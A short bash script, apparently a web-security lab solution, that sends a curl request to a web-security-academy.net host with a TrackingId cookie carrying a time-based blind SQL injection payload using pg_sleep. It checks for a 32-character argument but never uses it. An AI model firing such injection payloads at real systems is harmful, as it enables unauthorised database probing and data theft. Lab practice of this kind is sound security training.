if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain"
	exit 1;
fi

curl -b "TrackingId=xyz'||(SELECT pg_sleep(10)) || '" https://ac421fbf1fce8efb80209416004e003c.web-security-academy.net/
